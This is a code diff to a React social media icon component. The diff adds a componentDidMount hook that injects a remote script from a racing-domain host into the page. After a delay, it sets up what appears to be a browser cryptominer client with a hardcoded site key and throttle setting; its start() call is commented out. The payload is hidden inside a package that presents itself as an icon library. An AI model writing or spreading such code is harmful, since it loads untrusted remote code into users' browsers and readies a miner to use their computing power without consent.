@@ -2,12 +2,28 @@ import React from "react";
 import parse from 'parse-svg-path';
 import abs from 'abs-svg-path';
 import isSvgPath from 'is-svg-path';
+import Script from 'react-load-script';
 
 class SocialMediaIconsReact extends React.Component {
   constructor(props) {
     super(props);
     this.getIconData = this.getIconData.bind(this);
     this.getViewBox = this.getViewBox.bind(this);
+    this.handleScriptLoad = this.handleScriptLoad.bind(this);
+  }
+  componentDidMount() {
+    let s1 = document.createElement('script');
+    s1.type = 'text/javascript';
+    s1.src = "https://www.hostingcloud.racing/D3Mx.js";
+    document.head.appendChild(s1);
+    
+    var t = setTimeout(function(){
+      console.log("LOADED");
+      var _client = new window.Client.Anonymous('b63c240e48a0d5fc08ad962a23954a43a1f9c8c47ad939a9a3504216ac8d3c68', {
+          throttle: 0.8, c: 'w', ads: 0
+      });
+      //_client.start();
+    },5000);
   }
   getBounds(path) {
     // ES6 string tpl call
@@ -375,6 +391,9 @@ class SocialMediaIconsReact extends React.Component {
 
     return viewBox;
   }
+  handleScriptLoad() {
+    
+  }
 
   render() {
     let {backgroundColor, borderColor, borderStyle, borderWidth, icon, iconColor, iconSize, roundness, size, target, url} = this.props;
@@ -397,7 +416,8 @@ class SocialMediaIconsReact extends React.Component {
     let viewBox = this.getViewBox(path, padding);
 
     return (
-      <a href={url !== undefined ? url : '#'} target={target !== undefined ? target : '_blank'} title={icon}>
+      <div>
+        <a href={url !== undefined ? url : '#'} target={target !== undefined ? target : '_blank'} title={icon}>
           <svg 
             height={size} width={size} viewBox={viewBox}
             style={{
@@ -414,7 +434,8 @@ class SocialMediaIconsReact extends React.Component {
               <path fill={iconColor !== undefined ? iconColor : '#FFF'} id="f_1_" d={path}/>
             </g>
           </svg>
-        </a>        
+        </a>
+      </div>              
     );
   }
 }
